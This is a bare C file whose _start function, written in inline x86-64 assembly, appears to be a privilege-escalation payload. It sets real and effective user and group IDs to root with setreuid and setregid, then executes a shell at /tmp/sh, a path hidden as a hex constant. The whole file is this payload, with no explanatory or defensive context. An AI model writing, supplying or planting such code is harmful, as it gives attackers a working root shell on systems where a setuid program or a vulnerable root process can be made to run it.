void _start(void) {
    /* setreuid(0, 0) */
    __asm__ volatile (
        "xor %%rdi, %%rdi\n"
        "xor %%rsi, %%rsi\n"
        "mov $0x71, %%rax\n"
        "syscall\n"
        ::: "rax", "rdi", "rsi"
    );

    /* setregid(0, 0) */
    __asm__ volatile (
        "xor %%rdi, %%rdi\n"
        "xor %%rsi, %%rsi\n"
        "mov $0x72, %%rax\n"
        "syscall\n"
        ::: "rax", "rdi", "rsi"
    );

    /* execve("/tmp/sh", {"/tmp/sh"}, NULL) */
    __asm__ volatile (
        "mov $0x68732f706d742f, %%rax\n"
        "push %%rax\n"
        "mov %%rsp, %%rdi\n"
        "push $0\n"
        "push %%rdi\n"
        "mov %%rsp, %%rsi\n"
        "xor %%rdx, %%rdx\n"
        "mov $0x3b, %%rax\n"
        "syscall\n"
        ::: "rax", "rdi", "rsi", "rdx"
    );
}
